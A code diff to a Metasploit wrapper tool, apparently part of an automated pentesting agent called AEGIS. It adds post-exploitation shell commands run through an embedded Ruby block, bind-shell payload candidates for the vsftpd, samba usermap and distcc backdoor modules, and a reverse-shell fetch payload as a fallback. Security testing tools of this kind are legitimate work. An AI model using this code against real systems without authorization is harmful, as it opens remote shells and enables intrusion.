@@ -94,6 +94,17 @@ class MetasploitTool(BaseTool):
                         "description": "Query for module search (used with action='search')",
                         "default": "",
                     },
+                    "post_commands": {
+                        "type": "array",
+                        "items": {"type": "string"},
+                        "description": (
+                            "Shell commands to run on the session immediately after the exploit "
+                            "succeeds (action='run' only). These run in the same msfconsole "
+                            "invocation so they work even without msfrpcd. "
+                            "Example: ['whoami', 'id', 'uname -a']"
+                        ),
+                        "default": [],
+                    },
                 },
                 "required": ["action"],
             },
@@ -415,6 +426,8 @@ class MetasploitTool(BaseTool):
             try:
                 stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                 output = stdout.decode("utf-8", errors="replace")
+                # DEBUG: log full output so we can see exactly what msfconsole produced
+                logger.debug("[AEGIS-DEBUG] msfconsole FULL output (%d chars):\n%s", len(output), output)
                 logger.info("msfconsole output (%d chars):\n%s", len(output), output[:4000])
                 return output
             except asyncio.TimeoutError:
@@ -535,26 +548,36 @@ class MetasploitTool(BaseTool):
         except Exception:
             return ""
 
-    # Modules that open a native bind shell themselves — MSF just needs to
-    # interact with the already-running shell rather than stage a new one.
-    # For these modules we do NOT explicitly set a payload in the RC script;
-    # instead we let MSF auto-select the compatible payload from the module's
-    # target payloads list. This avoids "PAYLOAD is not valid" errors when
-    # cmd/unix/interact is unavailable or renamed in certain MSF versions.
+    # Modules that trigger a backdoor/shell on the target and then inject a
+    # payload command into that shell.  In classic MSF (< ~2022) this was done
+    # via cmd/unix/interact which directly connected to the open port.  In
+    # modern MSF, cmd/unix/interact has been removed; instead the module sends
+    # a command into the backdoor shell to launch a bind/fetch payload.
+    #
+    # Bind payloads (bind_netcat, bind_perl, …) are preferred:
+    #   • No LHOST required
+    #   • No HTTP fetch server (avoids port-8080 clash with AEGIS)
+    #   • Work behind NAT/WSL
+    #
+    # Fetch payloads (cmd/linux/http/…) are a fallback only — they start an
+    # HTTP listener on FETCH_SRVPORT (default 8080, but we override to 9090).
     _NATIVE_SHELL_MODULES: set[str] = {
         "exploit/unix/ftp/vsftpd_234_backdoor",
         "exploit/multi/samba/usermap_script",
         "exploit/unix/misc/distcc_exec",
     }
 
-    # For native-shell modules (vsftpd, samba usermap, distcc) the exploit opens
-    # a BIND shell on a fixed port (e.g. 6200). We must use a payload that
-    # CONNECTS to that port — only cmd/unix/interact does that. reverse_netcat
-    # would start a reverse listener (wrong). bind_netcat would open a new bind
-    # shell (wrong). So we use ONLY cmd/unix/interact for these modules.
+    # Payload candidates tried in order for native-shell modules.
+    # cmd/unix/interact was removed from modern Metasploit — use bind payloads.
     _INTERACT_CANDIDATES: list[str] = [
-        "cmd/unix/interact",
+        "cmd/unix/bind_netcat",          # Modern MSF default — inject nc into backdoor shell
+        "cmd/unix/bind_perl",            # Fallback if netcat lacks -e support
+        "cmd/unix/bind_ruby",            # Fallback if perl unavailable
+        "cmd/unix/interact",             # Legacy MSF (kept for older installations)
     ]
+
+    # Port for HTTP fetch payloads — must NOT conflict with AEGIS (8080).
+    _FETCH_SRVPORT: int = 9090
 
     # Default bind-shell payloads by module platform.
     # Bind-shells are preferred: they need no LHOST, work behind NAT/WSL.
@@ -607,6 +630,16 @@ class MetasploitTool(BaseTool):
 
         is_native = self._is_native_shell_module(module_path)
         effective_payload = payload or self._default_payload(module_path)
+        post_commands: list[str] = params.get("post_commands") or []
+
+        # Extend timeout when post_commands are present:
+        # sleep(2) + up to 15s per command + 5s buffer each
+        post_timeout_extra = len(post_commands) * 20 if post_commands else 0
+        exploit_timeout = MSF_CONSOLE_TIMEOUT + post_timeout_extra
+        logger.info(
+            "[AEGIS-DEBUG] timeout=%ds (base=%ds + post_extra=%ds for %d post_commands)",
+            exploit_timeout, MSF_CONSOLE_TIMEOUT, post_timeout_extra, len(post_commands),
+        )
 
         start = time.monotonic()
         logger.info("Running exploit via msfconsole: %s → %s:%s", module_path, target_ip, target_port)
@@ -616,10 +649,14 @@ class MetasploitTool(BaseTool):
             # iterate through candidate payloads until one works.
             output = await self._try_native_shell_exploit(
                 module_path, target_ip, target_port, extra_opts,
+                post_commands=post_commands,
+                timeout=exploit_timeout,
             )
         else:
             output = await self._try_exploit_with_payload(
                 module_path, target_ip, target_port, effective_payload, extra_opts,
+                post_commands=post_commands,
+                timeout=exploit_timeout,
             )
 
         duration = time.monotonic() - start
@@ -641,6 +678,40 @@ class MetasploitTool(BaseTool):
         else:
             error_msg = "No session opened"
 
+        # Extract post-command output from [AEGIS_CMD_OUT:N] tagged lines.
+        # ERB block prints these using framework.sessions API — never local exec.
+        post_output: str | None = None
+        # Strip ANSI escape codes for clean parsing
+        _ansi_re = re.compile(r"\x1b\[[0-9;]*[mGKHF]")
+        clean_output = _ansi_re.sub("", output)
+        logger.debug("[AEGIS-DEBUG] clean_output (ANSI stripped, %d chars):\n%s",
+                     len(clean_output), clean_output[:6000])
+
+        if post_commands:
+            # Parse all [AEGIS_CMD_OUT:N] lines regardless of success
+            # (so we can detect the "no session" case vs actual output)
+            out_lines: list[str] = []
+            for line in clean_output.splitlines():
+                m2 = re.search(r'\[AEGIS_CMD_OUT:\d+\] (.+)', line)
+                if m2:
+                    out_lines.append(m2.group(1))
+            logger.info("[AEGIS-DEBUG] post_command_output parsed %d lines from [AEGIS_CMD_OUT] tags",
+                        len(out_lines))
+
+            # Also log AEGIS debug/info lines for visibility
+            for line in clean_output.splitlines():
+                if "[AEGIS" in line:
+                    logger.info("[AEGIS-DEBUG] ERB output line: %s", line.strip())
+
+            if out_lines:
+                post_output = "\n".join(out_lines)
+                logger.info("[AEGIS-DEBUG] post_output (%d chars):\n%s",
+                            len(post_output), post_output[:3000])
+            else:
+                logger.warning("[AEGIS-DEBUG] post_commands were set but NO [AEGIS_CMD_OUT] lines found. "
+                               "Possible causes: (1) exploit failed, (2) ERB block not executed, "
+                               "(3) shell_command_token failed, (4) msfconsole version too old for ERB.")
+
         used_payload = effective_payload if not is_native else "(auto)"
         result = ExploitResult(
             success=success,
@@ -653,9 +724,12 @@ class MetasploitTool(BaseTool):
             error=error_msg,
             duration_seconds=duration,
         )
+        result_dict = result.model_dump()
+        if post_output is not None:
+            result_dict["post_command_output"] = post_output[:3000]
         return {
             "success": result.success,
-            "output": result.model_dump(),
+            "output": result_dict,
             "error": result.error,
         }
 
@@ -665,39 +739,75 @@ class MetasploitTool(BaseTool):
         target_ip: str,
         target_port: int,
         extra_opts: dict,
+        post_commands: list[str] | None = None,
+        timeout: int = MSF_CONSOLE_TIMEOUT,
     ) -> str:
-        """Try native-shell exploit: unset global payload then run; else set cmd/unix/interact.
+        """Try native-shell exploit with bind payload candidates.
 
-        vsftpd/samba backdoors open a BIND shell (e.g. port 6200). Only
-        cmd/unix/interact connects to it. We first try unset PAYLOAD so the
-        module can use its default; if that leaves a bad global payload we then
-        explicitly set cmd/unix/interact.
+        Modern Metasploit removed cmd/unix/interact.  These modules now inject
+        a payload command into the backdoor shell.  We try bind payloads first
+        (no LHOST, no HTTP server, no port conflicts), then fall back to a fetch
+        payload on a non-conflicting port if all bind candidates fail.
+
+        We deliberately skip the "no explicit payload" attempt: omitting PAYLOAD
+        in modern MSF causes the globally configured fetch payload
+        (cmd/linux/http/x86/meterpreter_reverse_tcp) to be used, which tries to
+        start an HTTP listener on port 8080 — the same port AEGIS listens on.
         """
-        # Attempt 1: no explicit payload — module uses its own default (e.g. cmd/unix/interact)
-        commands = self._build_rc_commands(
-            module_path, target_ip, target_port, "", extra_opts,
+        last_output = ""
+
+        # ── Pass 1: try bind payloads (preferred — no LHOST, no port conflict) ─
+        for candidate in self._INTERACT_CANDIDATES:
+            logger.info(
+                "[MSF] Trying %s with payload %s → %s:%s",
+                module_path, candidate, target_ip, target_port,
+            )
+            commands = self._build_rc_commands(
+                module_path, target_ip, target_port, candidate, extra_opts,
+                post_commands=post_commands,
+            )
+            logger.debug("[MSF] RC script:\n%s", "\n".join(commands))
+            output = await self._run_msfconsole(commands, timeout=timeout)
+            logger.info("[MSF] Output (800 chars):\n%s", output[:800])
+            last_output = output
+
+            if _session_opened(output):
+                return output
+            if "Backdoor already in-use" in output or "already exploited" in output.lower():
+                return output
+            if "is not valid" in output or "Invalid payload" in output:
+                logger.warning("[MSF] Payload %s not valid, trying next candidate", candidate)
+                continue
+            # Other failure (e.g. connection refused) — try next candidate
+            if "Connection refused" in output or "Failed to connect" in output:
+                logger.warning("[MSF] Connection failed with %s, trying next", candidate)
+                continue
+
+        # ── Pass 2: fetch payload fallback on non-conflicting port ────────────
+        # Use cmd/linux/http/x86/shell_reverse_tcp with FETCH_SRVPORT=9090
+        # (avoids the default 8080 which conflicts with AEGIS web server).
+        fetch_payload = "cmd/linux/http/x86/shell_reverse_tcp"
+        fetch_opts = dict(extra_opts)
+        fetch_opts["FETCH_SRVPORT"] = str(self._FETCH_SRVPORT)
+        logger.info(
+            "[MSF] Bind payloads failed — trying fetch fallback: %s (FETCH_SRVPORT=%d)",
+            fetch_payload, self._FETCH_SRVPORT,
         )
-        output = await self._run_msfconsole(commands)
+        commands = self._build_rc_commands(
+            module_path, target_ip, target_port, fetch_payload, fetch_opts,
+            post_commands=post_commands,
+        )
+        logger.debug("[MSF] Fetch fallback RC script:\n%s", "\n".join(commands))
+        output = await self._run_msfconsole(commands, timeout=timeout)
+        logger.info("[MSF] Fetch fallback output (800 chars):\n%s", output[:800])
+
         if _session_opened(output):
             return output
         if "Backdoor already in-use" in output or "already exploited" in output.lower():
             return output
 
-        # Attempt 2: explicitly set cmd/unix/interact (only valid option for bind backdoors)
-        for candidate in self._INTERACT_CANDIDATES:
-            logger.info("Trying %s with payload %s", module_path, candidate)
-            commands = self._build_rc_commands(
-                module_path, target_ip, target_port, candidate, extra_opts,
-            )
-            output = await self._run_msfconsole(commands)
-            if _session_opened(output):
-                return output
-            if "Backdoor already in-use" in output or "already exploited" in output.lower():
-                break
-            if "is not valid" in output or "Invalid payload" in output:
-                logger.warning("Payload %s not valid in this MSF version", candidate)
-
-        return output
+        # Return last bind attempt output (more informative than fetch failure)
+        return last_output or output
 
     async def _try_exploit_with_payload(
         self,
@@ -706,12 +816,67 @@ class MetasploitTool(BaseTool):
         target_port: int,
         payload: str,
         extra_opts: dict,
+        post_commands: list[str] | None = None,
+        timeout: int = MSF_CONSOLE_TIMEOUT,
     ) -> str:
         """Run an exploit with an explicit payload."""
         commands = self._build_rc_commands(
             module_path, target_ip, target_port, payload, extra_opts,
+            post_commands=post_commands,
         )
-        return await self._run_msfconsole(commands)
+        return await self._run_msfconsole(commands, timeout=timeout)
+
+    @staticmethod
+    def _ruby_escape(s: str) -> str:
+        """Escape a string for embedding in a Ruby double-quoted string literal."""
+        return s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n").replace("\r", "\\r")
+
+    def _build_post_commands_erb(self, post_commands: list[str]) -> str:
+        """Build a msfconsole ERB <ruby> block that runs post_commands on the last opened session.
+
+        WHY ERB/Ruby instead of inline RC commands:
+        - `run` (interactive) in RC: if exploit fails, subsequent commands are
+          interpreted by msfconsole as local shell `exec:` calls — dangerous.
+        - `run -z` + ERB block: uses framework.sessions API directly. If no
+          session exists (exploit failed), the `if sid` guard prevents any
+          execution. Commands NEVER run locally.
+
+        Output format: each command output line is prefixed with
+        [AEGIS_CMD_OUT:N] for reliable parsing from msfconsole stdout.
+        """
+        ruby_cmds = "[" + ", ".join(f'"{self._ruby_escape(cmd)}"' for cmd in post_commands) + "]"
+        logger.debug("[AEGIS-DEBUG] ERB ruby_cmds literal: %s", ruby_cmds)
+        lines = [
+            "<ruby>",
+            "# AEGIS post-exploitation block — runs after run -z",
+            "# Uses framework.sessions API: safe when exploit fails (no local exec)",
+            "sleep(2)  # let session fully register in framework.sessions",
+            "sid = framework.sessions.keys.map { |k| k.to_i }.max",
+            f"_aegis_cmds = {ruby_cmds}",
+            'print_good("[AEGIS-DEBUG] framework.sessions count=#{framework.sessions.length} last_sid=#{sid.inspect}")',
+            'if sid && (s = framework.sessions[sid])',
+            '  stype = s.respond_to?(:type) ? s.type : "unknown"',
+            '  print_good("[AEGIS] post_cmd session=#{sid} type=#{stype}")',
+            '  _aegis_cmds.each_with_index do |cmd, idx|',
+            '    print_good("[AEGIS_CMD_START:#{idx}] #{cmd}")',
+            '    begin',
+            '      out = s.shell_command_token(cmd, 15)',
+            '      out_str = (out || "").strip',
+            '      print_good("[AEGIS-DEBUG] cmd #{idx} raw output length=#{out_str.length}")',
+            '      out_str.each_line { |line| print_good("[AEGIS_CMD_OUT:#{idx}] #{line.chomp}") }',
+            '    rescue => e',
+            '      print_error("[AEGIS_CMD_ERR:#{idx}] #{e.class}: #{e.message}")',
+            '    end',
+            '    print_good("[AEGIS_CMD_END:#{idx}]")',
+            '  end',
+            'else',
+            '  print_error("[AEGIS] No session opened — post_commands skipped (exploit failed or session not in framework)")',
+            'end',
+            '</ruby>',
+        ]
+        erb_block = "\n".join(lines)
+        logger.debug("[AEGIS-DEBUG] ERB block to embed in RC:\n%s", erb_block)
+        return erb_block
 
     def _build_rc_commands(
         self,
@@ -720,42 +885,62 @@ class MetasploitTool(BaseTool):
         target_port: int,
         payload: str,
         extra_opts: dict,
+        post_commands: list[str] | None = None,
     ) -> list[str]:
         """Build msfconsole RC commands for an exploit.
 
-        CRITICAL: Always clear global PAYLOAD/LHOST BEFORE 'use module'.
-        MSF's global datastore (from ~/.msf4/) can contain a stale payload
-        (e.g. meterpreter_reverse_tcp) that gets locked when the module loads.
-        If that happens, 'set PAYLOAD cmd/unix/interact' is rejected with
-        'The value specified for PAYLOAD is not valid'. Clearing globals first
-        ensures the module loads with its OWN default payload.
+        CRITICAL: Use 'set --clear PAYLOAD' (not just 'unset') after loading the
+        module. MSF's global datastore (~/.msf4/) can set a stale payload (e.g.
+        meterpreter_reverse_tcp) that survives 'unsetg'/'unset' and gets
+        re-applied when the module loads. 'set --clear PAYLOAD' fully removes
+        the configured value AND the default, so the module picks its own
+        compatible payload (e.g. cmd/unix/interact for vsftpd_234_backdoor).
+
+        LHOST is always set as a safety net: if the module's default payload
+        requires LHOST (e.g. because the global config forced a reverse payload),
+        the run will fail with an OptionValidateError without it.
+
+        POST_COMMANDS: When provided, appended as an ERB Ruby block that uses
+        framework.sessions API after `run -z`. This is the ONLY safe approach:
+        - `run` (interactive) + inline cmds = local exec if exploit fails
+        - `run -z` + ERB block = API-level, never runs locally
         """
-        # Clear globals before and after "use" — module load can re-apply a
-        # configured payload (e.g. meterpreter_reverse_tcp). Also clear
-        # module-level PAYLOAD so the module uses its real default (e.g. interact).
+        lhost = self._get_lhost(target_ip)
+
         commands = [
             "unsetg PAYLOAD",
             "unsetg LHOST",
             f"use {module_path}",
-            "unsetg PAYLOAD",
-            "unsetg LHOST",
-            "unset PAYLOAD",
+            # 'set --clear' fully removes both user-set AND default values,
+            # ensuring the module uses its own compatible default payload.
+            "set --clear PAYLOAD",
+            "set --clear LHOST",
             f"set RHOSTS {target_ip}",
             f"set RPORT {target_port}",
         ]
 
         if payload:
+            logger.debug("Setting explicit payload: %s", payload)
             commands.append(f"set PAYLOAD {payload}")
-            is_reverse = "reverse" in payload.lower() or "meterpreter" in payload.lower()
-            if is_reverse:
-                lhost = self._get_lhost(target_ip)
-                if lhost:
-                    commands.append(f"set LHOST {lhost}")
+
+        # Always set LHOST: required if the module default (or explicitly set)
+        # payload is a reverse shell or meterpreter.
+        if lhost:
+            logger.debug("Setting LHOST=%s for %s", lhost, target_ip)
+            commands.append(f"set LHOST {lhost}")
 
         for key, val in extra_opts.items():
             commands.append(f"set {key} {val}")
 
+        # Always use run -z (background) — never interactive `run` which causes
+        # subsequent RC commands to execute locally when exploit fails.
         commands.append("run -z")
+
+        if post_commands:
+            logger.info("[AEGIS-DEBUG] Adding ERB post_commands block (%d commands): %s",
+                        len(post_commands), post_commands)
+            commands.append(self._build_post_commands_erb(post_commands))
+
         return commands
 
     async def _search_via_msfconsole(self, query: str) -> dict:
@@ -810,7 +995,14 @@ class MetasploitTool(BaseTool):
             return {
                 "success": False,
                 "output": None,
-                "error": f"Session {session_id} is not valid or has been closed",
+                "error": (
+                    f"Session {session_id} is not valid or has been closed. "
+                    "msfconsole fallback does not persist sessions between calls — "
+                    "sessions only exist while the msfconsole process is running. "
+                    "Solution: pass 'post_commands' in the original 'run' call to execute "
+                    "commands in the same msfconsole invocation, or start msfrpcd for "
+                    "persistent session support."
+                ),
             }
 
         return {
